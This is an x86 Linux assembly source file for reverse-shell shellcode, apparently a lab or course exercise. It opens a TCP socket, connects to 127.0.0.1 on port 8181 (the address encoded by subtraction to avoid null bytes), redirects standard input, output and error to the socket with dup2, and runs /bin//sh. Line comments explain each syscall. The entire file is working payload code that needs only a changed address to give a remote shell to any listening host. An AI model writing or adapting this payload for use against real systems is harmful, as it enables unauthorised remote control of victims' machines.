global _start

section .text
_start:

	;syscall int socketcall(int call, unsigned long *args);
	xor eax, eax	;zeroing the eax register
	xor ebx, ebx 	;zeroing the ebx register
	xor ecx, ecx 	;zeroing the ecx register
	xor edi, edi
	mov  al, 0x66	;socketcall is 0x66
	
	;socket create
	mov  bl, 0x01	;int call=1 because we create socket
	;call socket int socket(int domain ,int type, int protocol)
	;pushing the values in reverse order

	push 0x06	;IPPROTO_TCP (int protocol=6)
	push 0x01	;SOCK_STREAM (int type=1)
	push 0x02	;AF_INER (int domain=2)
	mov ecx, esp 	;pointer on the starting point of parameters on the stack
	int 0x80	;invoking the syscall	
	mov edi, eax	;storing the sockfd

	;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	;syscall int socketcall(int call, unsigned long *args);
        xor eax, eax    ;zeroing the eax register
        xor ebx, ebx    ;zeroing the ebx register
        xor ecx, ecx    ;zeroing the ecx register
        mov  al, 0x66   ;socketcall is 0x66
	mov  bl, 0x03	;increment bl to 3 (int call=3 for connect function)
 
        push ecx        ;4 bytes of Zero
        push ecx        ;4 bytes of Zero

	;The address 127.0.0.1 in reverse order is 0x0100007f + 0xfeffff80=0xffffffff
	;0x0100007f = 0xffffffff - 0xfeffff80
        mov esi, 0xffffffff     ;mov on esi the value 0xffffffff 
	sub esi, 0xfeffff80	;subtract from esi value 0xffffffff  
	push esi		;esi is now 0x0100007f and this value is push on the stack

	push word 0xf51f 	;2 bytes (push of port 8181 1FF5 in reverse order little Endian)
	push word 0x02		;Family (AF_INET)= 0x0002 (2 bytes)
	mov ecx, esp		;the parammeters of the bind to ecx
	
	push 0x10	;push the length of address 16 in decimal
	push ecx	;pointer to ecx
	push edi	;int sockfd (returned from  socket call and stored on edi)
	mov ecx, esp
	int 0x80	;invoking the syscall


	;int dup2(int oldfd, int newfd)
	xor eax, eax
	xor ecx, ecx
	mov cl, 0x02	;As a counter for 3 times

loop:
	mov al, 0x3f	;The system call dup2
	int 0x80
	dec ecx	
	jns loop	;Jump Not set. Jump if the sign flag (s) is NOT set
			;sign flag gets set when the result is negative -1


	;execve /bin//sh
	xor eax, eax
	push eax

	;push the /bin//sh

	push 0x68732f2f		;"hs//"
	push 0x6e69622f		;"nib/"

	mov ebx, esp	;pointer to the address of the /bin//sh
	push eax	;push zero in stack
	mov edx, esp	;store the zero in edx

	push ebx
	mov ecx, esp

	mov al, 0x0b
	int 0x80

